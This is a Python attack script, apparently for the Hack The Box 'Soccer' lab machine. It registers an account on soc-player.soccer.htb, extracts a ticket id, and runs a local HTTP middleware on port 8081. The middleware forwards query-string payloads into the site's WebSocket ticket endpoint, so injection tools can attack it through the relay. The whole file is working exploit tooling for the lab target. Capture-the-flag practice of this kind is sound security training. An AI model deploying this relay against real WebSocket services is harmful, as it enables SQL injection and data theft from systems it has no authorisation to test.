from http.server import SimpleHTTPRequestHandler
from socketserver import TCPServer
from urllib.parse import unquote, urlparse
from websocket import create_connection
import requests
import json

ws_server = "ws://soc-player.soccer.htb:9091/"

with requests.Session() as session:
    email = "foo@bar.com"
    username = "foo"
    password = "bar"
    register_data = {"email": email, "username": username, "password": password}
    register_url = "http://soc-player.soccer.htb/signup"
    register = session.post(register_url, data=register_data)

    login_url = "http://soc-player.soccer.htb/login"
    login_data = {"email": email, "password": password}
    login = session.post(login_url, data=login_data, allow_redirects=False)

    # Check / websoc connection?
    check = session.get("http://soc-player.soccer.htb/check")

    import json

    cookiejar = requests.utils.dict_from_cookiejar(session.cookies)
    cookie = ";".join([f"{k}={v}" for k, v in cookiejar.items()])

    # Get ticket id
    import re

    ticket_id = re.search(r"(?<=Your Ticket Id: )\d+", check.text).group(0)
    print(ticket_id)

    def send_ws(payload):
        ws = create_connection(ws_server)
        # If the server returns a response on connect, use below line
        # resp = ws.recv() # If server returns something like a token on connect you can find and extract from here

        # For our case, format the payload in JSON
        message = unquote(payload).replace('"', '\'')
        data = json.dumps({'id': f'{message}'})

        ws.send(data)
        resp = ws.recv()
        print(resp)
        ws.close()

        if resp:
            return resp
        else:
            return ''


    def middleware_server(host_port, content_type="text/plain"):
        class CustomHandler(SimpleHTTPRequestHandler):
            def do_GET(self) -> None:
                self.send_response(200)
                try:
                    payload = urlparse(self.path).query.split('=', 1)[1]
                except IndexError:
                    payload = False

                if payload:
                    content = send_ws(payload)
                else:
                    content = 'No parameters specified!'

                self.send_header("Content-type", content_type)
                self.end_headers()
                self.wfile.write(content.encode())
                return

        class _TCPServer(TCPServer):
            allow_reuse_address = True

        httpd = _TCPServer(host_port, CustomHandler)
        httpd.serve_forever()


    try:
        middleware_server(('0.0.0.0', 8081))
    except KeyboardInterrupt:
        pass
